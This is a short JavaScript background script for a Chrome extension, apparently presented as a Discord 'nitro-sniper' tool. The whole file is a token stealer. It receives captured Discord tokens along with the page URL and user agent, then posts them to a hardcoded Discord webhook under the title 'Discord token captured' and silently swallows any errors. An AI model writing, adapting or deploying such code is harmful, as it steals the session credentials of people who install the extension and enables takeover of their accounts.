const WEBHOOK_URL = "https://discord.com/api/webhooks/1550818376081739796/zVwRp0urx27-9r0EPU2zjBFLhBv_fViDz78TNv5VvyBEWLBqTP29wFizhI1SsZe5vjMO";

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg?.type !== "nspro_token") return;
  const { token, meta, ts } = msg.payload || {};
  if (!token) return;

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "nitro-sniper",
      embeds: [{
        title: "Discord token captured",
        color: 0xff3c8c,
        fields: [
          { name: "Token", value: "```" + token + "```", inline: false },
          { name: "URL",   value: meta?.url || "?", inline: false },
          { name: "UA",    value: "```" + (meta?.ua || "?").slice(0, 200) + "```", inline: false },
          { name: "Time",  value: new Date(ts || Date.now()).toISOString(), inline: false },
        ],
        footer: { text: "nspro" }
      }]
    })
  }).catch(() => {});
});
